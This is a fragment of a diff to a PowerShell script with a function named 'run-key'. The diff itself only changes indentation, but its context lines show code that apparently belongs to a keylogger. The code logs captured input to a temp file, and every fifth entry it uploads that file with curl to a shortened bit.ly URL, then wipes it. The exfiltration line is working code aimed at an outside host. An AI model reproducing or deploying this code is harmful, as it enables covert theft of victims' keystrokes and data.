@@ -40,13 +40,13 @@ function run-key()
             {
               $counter = 0
               cmd.exe /c "echo $lista>>%temp%\log.dat"
-			  $send++
-			  if ($send -ge 5)
-			  {
-				$send = 0
+              $send++
+              if ($send -ge 5)
+              {
+                $send = 0
                 cmd.exe /c "curl -T %temp%\log.dat -Ls https://bit.ly/3DHmzBN"
-				cmd.exe /c "echo.>%temp%\log.dat"
-			  }
+                cmd.exe /c "echo.>%temp%\log.dat"
+              }
             }
             if ($lista.endswith("9"))
             {
